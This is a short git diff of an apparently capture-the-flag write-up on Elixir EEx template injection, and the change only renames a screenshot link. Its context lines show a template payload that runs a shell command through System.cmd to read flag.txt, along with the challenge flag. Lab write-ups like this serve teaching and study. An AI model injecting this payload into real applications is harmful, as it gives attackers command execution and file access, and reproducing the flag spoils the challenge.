@@ -44,6 +44,6 @@ Then, will read `flag.txt` using this payload, of course base64 encoded:
 <%= elem(System.cmd("/bin/sh", ["-c", "cat flag.txt"]), 0) %>
 ```
 
-![FINAL](./images/PHP-Unserialize-overflow_FINAL.png)
+![FINAL](./images/Elixir-EEx_FINAL.png)
 
 **Flag:** ***`RM{EEx_C@n_b3_DanGeR0u$:)!}`***
